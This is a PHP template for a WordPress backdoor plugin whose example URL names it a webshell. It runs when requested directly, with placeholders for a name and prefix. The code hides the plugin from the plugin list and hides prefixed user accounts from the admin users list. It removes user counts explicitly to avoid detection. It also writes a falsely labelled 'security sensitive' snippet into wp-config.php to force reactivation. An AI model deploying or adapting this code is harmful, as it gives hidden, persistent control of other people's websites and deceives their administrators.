<?php
/*
 * Plugin Name: __PLUGIN_NAME__
 * Description: __PLUGIN_DESCRIPTION__
 * Version: __PLUGIN_VERSION__
 * Author: __PLUGIN_AUTHOR__
 * Requires PHP: 5.3
 */

// Check if accessed directly
if (!defined('ABSPATH')) {
    define("__WP__", true);

    $wp_load = $_REQUEST['wp-load'] ?: "../../../wp-load.php";
    if (!file_exists($wp_load) && empty($_REQUEST['wp-load'])) {
        echo "<pre>";
        echo "ALERT: wp-load.php not found. Please provide the path to the wp-load.php file using the 'wp-load' parameter.";
        echo "Example: http://example.com/wp-content/plugins/webshell/template.php?wp-load=../../wp-load.php";
        echo "\n\n";
        echo "Current path: " . basename(__FILE__);
        echo "</pre>";

        exit;
    }

    require_once $wp_load;

    // __TEMPLATE_INSERTION_POINT__

    exit;
}

/**
 * Hide the current plugin from the plugin list
 *
 * @param $plugins array List of plugins
 *
 * @return array List of plugins
 */
function __PREFIX__hide_plugin_from_list($plugins) {
    // Hide the current plugin from the plugin list
    unset($plugins[plugin_basename(__FILE__)]);

    // Return the list of plugins
    return $plugins;
}

add_filter('all_plugins', '__PREFIX__hide_plugin_from_list');


/**
 * Filter the users array to hide users with a specific prefix
 *
 * @param $user_query WP_User_Query User query object
 */
function filter_users_by_prefix($user_query) {
    /*ob_start();
    var_dump(WP_Screen::get());
    $hook_suffix = ob_get_clean();
    throw new Exception($hook_suffix);*/
    // check if the script is executed directly, in that case the shell is loaded and all users are returned
    if (defined('__WP__')) {
        return $user_query;
    }

    global $wpdb;

    // Get the prefix to hide
    $prefix = '__PREFIX__';

    // Modify the WHERE clause of the user query to exclude users with the prefix
    $user_query->query_where .= " AND {$wpdb->users}.user_login NOT LIKE '{$wpdb->esc_like($prefix)}%' ";
}

add_action('pre_user_query', 'filter_users_by_prefix');

/**
 * Filter the views of the users list removing the number of users per section reducing the possibility of detection
 * via the number of users
 *
 * @param $views array List of views
 *
 * @return mixed
 * @throws Exception
 */
function filter_users_views($views) {
    // Regular expression pattern to match content within parentheses
    $pattern = '/\([^)]*\)/';
    foreach ($views as $key => $value) {
        // Update the view with the replaced content
        $views[$key] = preg_replace($pattern, '', $value);
    }

    return $views;
}

add_filter( "views_users", "filter_users_views");


/**
 * Get the path to the wp-config.php file
 *
 * @return string Path to the wp-config.php file
 */
function __PREFIX__get_wp_config_path() {
    // Try to get the path using ABSPATH constant
    if (defined('ABSPATH')) {
        return ABSPATH . 'wp-config.php';
    }

    return plugin_dir_path(__FILE__) . "../../../wp-config.php";
}

/**
 * Add an auto activation snippet to the wp-config.php file.
 * This will automatically activate the plugin whenever the WordPress site is loaded.
 */
function __PREFIX__add_auto_activation_snippet() {
    // Get the path to the wp-config.php file
    $wp_config_path = __PREFIX__get_wp_config_path();

    // Check if the file exists or fail silently
    if (file_exists($wp_config_path)) {
        $wp_config = file_get_contents($wp_config_path);

        $plugin                  = plugin_basename(__FILE__);
        $auto_activation_snippet = <<<EOT

// Auto activate security sensitive plugin - do not remove
\$active_plugins = get_option('active_plugins', array());

// Check if the plugin is already activated
if (!in_array("$plugin", \$active_plugins)) {
    \$active_plugins[] = "$plugin";
    update_option('active_plugins', \$active_plugins);
}

EOT;

        // Check if the snippet is already in the file
        if (strpos($wp_config, $auto_activation_snippet) === false) {
            file_put_contents($wp_config_path, $auto_activation_snippet, FILE_APPEND);
        }
    }
}

function __PREFIX__activate() {
    __PREFIX__add_auto_activation_snippet();
}

function __PREFIX__deactivate() {}

register_activation_hook(
    __FILE__,
    '__PREFIX__activate'
);

register_deactivation_hook(
    __FILE__,
    '__PREFIX__deactivate'
);